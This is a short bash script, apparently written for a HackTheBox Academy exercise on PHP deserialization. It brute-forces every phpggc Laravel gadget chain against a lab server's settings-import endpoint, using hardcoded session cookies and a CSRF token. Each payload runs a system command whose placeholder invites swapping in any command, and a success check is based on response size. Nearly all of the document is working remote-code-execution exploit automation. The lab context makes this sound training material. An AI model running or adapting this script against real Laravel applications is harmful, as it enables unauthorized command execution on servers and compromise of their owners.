#!/bin/bash
# I created this script to solve the HackTheBox Academy section of "Exploiting PHP Deserialization".  This script will iterate through all laravel gadgets, 
# run the gadget, and tell us if the gadget is successful.  I used this for a Laravel gadget chain, but this can be used for any other phpggc gadget chain. 
# Before running the script, first register a user and log in. 

function deserialization_attack() {
gadget=$1
user_cmd='id'   # replace with the command you want over here
payload=$(phpggc "$gadget" system "$user_cmd" -b 2>/dev/null)

request=$(curl -sq "http://10.129.106.253:8000/settings-ie" --cookie 'XSRF-TOKEN=eyJpdiI6InV3YXg0ZjZhNnJlbFVYeiswZlRQUWc9PSIsInZhbHVlIjoicG9YTGh5cHM4dXk0VzFTNll6MmdBYVRFNW42Y25SVTU0OGM0dmxPZ2lLZGQ1cHNweDlUVVBDOVRIazd4Y01LNXpLS09HZk1CbWppdjZiYWZhRVhtK0FhT09wQUM2SFNvTGZQeThXVnFwY3V5KzVNNkw0aDhaNThvamxaL3cwN3giLCJtYWMiOiI5YjU4NmFlMTVhY2QyM2MyMmEwZjdlMWUyNGU1ZDdmZDcyMmRlNzhiZTVmZmM5ZGNjYzUxZjAwZjdhNjFiMjgxIiwidGFnIjoiIn0%3D;
laravel_session=eyJpdiI6IlN2bTNIcHpNZVprSU83TWVyUm1adVE9PSIsInZhbHVlIjoicS9CbkpMaEtkcVNMdXBIL1ZWYm1RcUpzeU95d1FMQjREaHhyNUhsUU1GeWxkUkl6MkZTRHQyOHhHV2Jhd0pNdEI3V01HRXhvU2ZSMlJRQWZBUzAwbUIyaGVMOFJNelNSUGQxRnUwa3R3NHZSQ0JxdklQVDZtN1BiSTlYZDF2L2ciLCJtYWMiOiJhZThiNTE4YTEwNWFiNjIyMzRmZTIyMTMwYzFhMTY2OTlkNjI2YjQxMWU1NTFjYTUzYTc1ZmNhYzBlYTRhZjgzIiwidGFnIjoiIn0%3D'
--data-binary "_token=OFWPfyChgSPx34tOrhrwQMs48TFauy0HeK96GGk3&settings=$payload&import=" --proxy "http://127.0.0.1:8080" -w "%{size_download}\n" -o /dev/null)

# Check if the gadget was successful: successful gadgets return a length greater then 6620
if [[ $request > 6620 ]];
  then echo "gadget $gadget is successful";
  fi;
}

export -f deserialization_attack

parallel -j 100 deserialization_attack ::: $(phpggc -l Laravel|awk '{print $1}'|grep Laravel)
